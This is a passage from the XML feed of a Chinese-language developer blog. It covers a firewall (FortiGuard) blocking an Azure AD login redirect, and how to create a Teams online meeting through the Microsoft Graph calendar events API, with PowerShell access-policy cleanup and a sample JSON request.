rel="noopener">https://graph.microsoft.com</a></strong> ，<br>發現它會轉址到 <strong><a href="https://developer.microsoft.com/graph" target="_blank" rel="noopener">https://developer.microsoft.com/graph</a></strong>，<br>在網頁中，該網址會被 FortiGuard 擋掉。<br><img src="/2022/05/04/openidconnecthandler-getuserinformationasync-tls-error/01.png" title="FortiGuard Block URL"></p><p>後來申請正式機允許可以連出到 <strong><a href="https://developer.microsoft.com" target="_blank" rel="noopener">https://developer.microsoft.com</a></strong>，<br>Web App 就可以正常登入了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;我們有個 Web App 部署到正式環境，透過 Azure AD 登入後，&lt;br&gt;程式會轉到 Web App 的 &lt;strong&gt;/sign
      
    
    </summary>
    
    
      <category term="Azure" scheme="https://rainmakerho.github.io/tags/Azure/"/>
    
      <category term="OpenIdConnectHandler.GetUserInformationAsync" scheme="https://rainmakerho.github.io/tags/OpenIdConnectHandler-GetUserInformationAsync/"/>
    
      <category term="OpenIdConnectHandler.HandleRemoteAuthenticateAsync" scheme="https://rainmakerho.github.io/tags/OpenIdConnectHandler-HandleRemoteAuthenticateAsync/"/>
    
      <category term="FortiGuard" scheme="https://rainmakerho.github.io/tags/FortiGuard/"/>
    
      <category term="SSL" scheme="https://rainmakerho.github.io/tags/SSL/"/>
    
  </entry>
  
  <entry>
    <title>Teams 在 Calendar 上建立 會議 ，並設定它是線上會議</title>
    <link href="https://rainmakerho.github.io/2022/05/04/teams-create-enable-online-meeting/"/>
    <id>https://rainmakerho.github.io/2022/05/04/teams-create-enable-online-meeting/</id>
    <published>2022-05-04T00:22:22.000Z</published>
    <updated>2022-05-04T03:40:27.433Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在 <a href="https://rainmakerho.github.io/2022/04/29/teams-app-access-meetings-behalf-user/">Teams App 代替使用者建立線上會議，讓該使用者為會議主持人</a> 可以透過 App 快速建立 <strong>線上會議</strong> 。<br>但這樣只是建立線上會議，跟 Calendar 無關，而且還要透過 Access Policy 去設定。<br>所以更方便的做法就是在 Calendar 上建立 會議 ，並設定它是線上會議，這樣就不用特別去設定 Access Policy。</p><h3 id="實作"><a href="#實作" class="headerlink" title="實作"></a>實作</h3><p>因為要建立 Calendar ，所以 App 需要的 Application permissions 為 <strong>Calendars.ReadWrite</strong>，而原本需要的 <strong>OnlineMeetings.ReadWrite.All</strong><br>權限則可以 <strong>Revoke admin consent</strong> 後，再 <strong>Remove premission</strong>。<br>將 App 從 Access Policy 中移除，移除套用 Access Policy 的使用者， 並將 Access Policy 移除。<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 移除套用 Access Policy 的使用者</span></span><br><span class="line">Get-CsOnlineUser | Grant-CsApplicationAccessPolicy -PolicyName <span class="literal">$Null</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 將 App 從 Access Policy 中移除</span></span><br><span class="line">Set-CsApplicationAccessPolicy -Identity <span class="string">"teams-meetings-policy"</span> -AppIds @&#123;Remove=<span class="string">"要移的Application (client) ID"</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#將 Access Policy 移除</span></span><br><span class="line">Remove-CsApplicationAccessPolicy -Identity <span class="string">"teams-meetings-policy"</span></span><br></pre></td></tr></table></figure></p><p>加入 <strong>Calendars.ReadWrite</strong> 權限後，一樣需要 <strong>Grant admin consent</strong>。</p><p>再來就是取得 <strong>App 的 Token</strong><br>依 <a href="https://docs.microsoft.com/en-us/graph/auth-v2-service" target="_blank" rel="noopener">Get access without a user</a> 的 <strong>4. Get an access token</strong> ，<br>依 Application (client) ID 及 Client secrets，Scope 給 <strong><a href="https://graph.microsoft.com/.default" target="_blank" rel="noopener">https://graph.microsoft.com/.default</a></strong> 來取回 Token。<br><img src="https://rainmakerho.github.io/2022/04/29/teams-app-access-meetings-behalf-user/02.png" alt="Get App Token"></p><h4 id="在-Calendar-上建立-會議-，並設定它是線上會議"><a href="#在-Calendar-上建立-會議-，並設定它是線上會議" class="headerlink" title="在 Calendar 上建立 會議 ，並設定它是線上會議"></a>在 Calendar 上建立 會議 ，並設定它是線上會議</h4><p>依 <a href="https://docs.microsoft.com/en-us/graph/outlook-calendar-online-meetings?tabs=http" target="_blank" rel="noopener">Enable an event as an online meeting in an Outlook calendar</a>，拿上述取得的 App Token ，使用 <code>https://graph.microsoft.com/v1.0/users/{user Object Id}/events</code> ，並給會議的資訊，例如，<br><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"subject"</span>: <span class="string">"線上會議測試"</span>,</span><br><span class="line">  <span class="attr">"body"</span>: &#123;</span><br><span class="line">    <span class="attr">"contentType"</span>: <span class="string">"HTML"</span>,</span><br><span class="line">    <span class="attr">"content"</span>: <span class="string">"&lt;h3&gt;hello events&lt;/h3&gt;線上會議測試--- 有時間嗎?"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"start"</span>: &#123;</span><br><span class="line">      <span class="attr">"dateTime"</span>: <span class="string">"2022-05-03T18:00:00.0000000+08:00"</span>,</span><br><span class="line">      <span class="attr">"timeZone"</span>: <span class="string">"Pacific Standard Time"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"end"</span>: &#123;</span><br><span class="line">      <span class="attr">"dateTime"</span>: <span class="string">"2022-05-03T18:30:00.0000000+08:00"</span>,</span><br><span class="line">      <span class="attr">"timeZone"</span>: <span class="string">"Pacific Standard Time"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"location"</span>:&#123;</span><br><span class="line">      <span class="attr">"displayName"</span>:<span class="string">"666 會議室"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"attendees"</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"emailAddress"</span>: &#123;</span><br><span class="line">        <span class="attr">"address"</span>:<span class="string">"rainmaker@rm.com.tw"</span>,</span><br><span class="line">        <span class="attr">"name"</span>: <span class="string">"rainmaker"</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">"type"</span>: <span class="string">"required"</span></span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">"allowNewTimeProposals"</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">"isOnlineMeeting"</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">"onlineMeetingProvider"</span>: <span class="string">"teamsForBusiness"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>這樣就會在行事曆中顯示該線上會議，<br><img src="/2022/05/04/teams-create-enable-online-meeting/01.png" title="Post events"></p><img src="/2022/05/04/teams-create-enable-online-meeting/02.png" title="線上會議"><h3 id="參考資源"><a href="#參考資源" class="headerlink" title="參考資源"></a>參考資源</h3><p><a href="https://docs.microsoft.com/en-us/graph/outlook-calendar-online-meetings?tabs=http" target="_blank" rel="noopener">Enable an event as an online meeting in an Outlook calendar</a><br><a href="https://docs.microsoft.com/en-us/powershell/module/skype/grant-csapplicationaccesspolicy?view=skype-ps" target="_blank" rel="noopener">Grant-CsApplicationAccessPolicy</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;在 &lt;a href=&quot;https://rainmakerho.github.io/2022/04/29/teams-app-access-m
      
    
    </summary>
    
    
      <category term="OnlineMeetings.ReadWrite.All" scheme="https://rainmakerho.github.io/tags/OnlineMeetings-ReadWrite-All/"/>
    
      <category term="teams" scheme="https://rainmakerho.github.io/tags/teams/"/>
    
      <category term="meeting" scheme="https://rainmakerho.github.io/tags/meeting/"/>
    
      <category term="outlook" scheme="https://rainmakerho.github.io/tags/outlook/"/>
    
      <category term="calendar" scheme="https://rainmakerho.github.io/tags/calendar/"/>
    
      <category term="Calendars.ReadWrite" scheme="https://rainmakerho.github.io/tags/Calendars-ReadWrite/"/>
    
  </entry>
  
</feed>
